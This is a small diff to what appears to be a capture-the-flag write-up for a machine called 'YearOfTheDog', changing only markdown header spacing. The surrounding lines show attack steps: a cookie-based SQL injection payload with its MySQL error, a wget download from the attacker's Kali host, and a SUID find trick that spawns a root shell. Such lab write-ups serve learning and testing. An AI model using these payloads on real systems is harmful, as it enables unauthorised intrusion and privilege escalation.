@@ -1,4 +1,4 @@
-#YearOfTheDog
+# YearOfTheDog
 
 ```
 Ports:
@@ -26,7 +26,7 @@ edit cookie id='
 
 	Error:YouhaveanerrorinyourSQLsyntax;checkthemanualthatcorrespondstoyourMySQLserverversionfortherightsyntaxtousenear'''''atline1
 
-###Payloads
+### Payloads
 
 Cookie:id='unionselect1,database()---
 
@@ -143,4 +143,5 @@ wget http://{kali}/find
 chmod 4755 find  		## suid permission
 
 dylan@machine$> ./find . -exec /bin/sh -p\; -quit
+
 root#>
